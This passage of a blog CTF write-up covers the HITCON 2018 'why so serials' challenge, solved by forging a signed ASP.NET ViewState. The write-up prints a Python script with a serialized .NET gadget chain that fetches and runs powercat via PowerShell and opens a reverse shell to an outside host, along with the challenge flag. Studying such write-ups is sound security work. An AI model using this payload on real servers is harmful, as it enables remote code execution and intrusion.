class="string">"/wEy7xIAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAAtQEvYyBwb3dlcnNoZWxsIElFWCAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYmNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iZXNpbW9yaGluby9wb3dlcmNhdC9tYXN0ZXIvcG93ZXJjYXQucHMxJyk7cG93ZXJjYXQgLWMga2FpYnJvLnR3IC1wIDUyNzggLWUgY21kBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BgsAAACwAlN5c3RlbS5GdW5jYDNbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkKBg0AAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQkPAAAACQ0AAAAJDgAAAAYUAAAAPlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIFN0YXJ0KFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhUAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEKAAAACQAAAAYWAAAAB0NvbXBhcmUJDAAAAAYYAAAADVN5c3RlbS5TdHJpbmcGGQAAACtJbnQzMiBDb21wYXJlKFN5c3RlbS5TdHJpbmcsIFN5c3RlbS5TdHJpbmcpBhoAAAAyU3lzdGVtLkludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykIAAAACgEQAAAACAAAAAYbAAAAcVN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCQwAAAAKCQwAAAAJGAAAAAkWAAAACgs="</span></div><div class="line"></div><div class="line">validation_key = <span class="string">"b07b0f97365416288cf0247cffdf135d25f6be87"</span>.decode(<span class="string">'hex'</span>)</div><div class="line"></div><div class="line">serialized_data = base64.b64decode(serialized_data_b64)</div><div class="line"></div><div class="line">m = hashlib.md5()</div><div class="line"></div><div class="line">m.update(serialized_data + validation_key + <span class="string">"\x00\x00\x00\x00"</span>)</div><div class="line"></div><div class="line">payload = base64.b64encode(serialized_data + m.digest())</div><div class="line"></div><div class="line">print(payload)</div></pre></td></tr></table></figure>
+<p>得到的payload就是一個合法的ViewState value，直接塞過去就能Reverse shell !</p>
+<p><img src="https://i.imgur.com/Q946Aqv.png" alt=""></p>
+<p><img src="https://i.imgur.com/orHuYPD.png" alt=""></p>
+<p><code>hitcon{c0ngratulati0ns! you are .net king!}</code></p>
+<p>好玩又實用的題目XD</p>
+<p><br></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li><a href="https://github.com/orangetw/My-CTF-Web-Challenges" target="_blank" rel="external">https://github.com/orangetw/My-CTF-Web-Challenges</a></li>
+<li><a href="https://cyku.tw/ctf-hitcon-2018-why-so-serials/" target="_blank" rel="external">https://cyku.tw/ctf-hitcon-2018-why-so-serials/</a></li>
+<li><a href="https://hackmd.io/s/SkxOwAqiQ" target="_blank" rel="external">https://hackmd.io/s/SkxOwAqiQ</a></li>
+<li><a href="https://xz.aliyun.com/t/3019" target="_blank" rel="external">https://xz.aliyun.com/t/3019</a></li>
+<li><a href="https://xz.aliyun.com/t/3009" target="_blank" rel="external">https://xz.aliyun.com/t/3009</a></li>
+<li><a href="http://wonderkun.cc/index.html/?p=718" target="_blank" rel="external">http://wonderkun.cc/index.html/?p=718</a></li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/08/20/DEFCON-26-Final-CTF初體驗/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">DEFCON 26 Final CTF初體驗</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+
+
+<section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'kaibrosblog'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2018 KaiBro
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-61797645-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  </div>
+</body>
+</html>
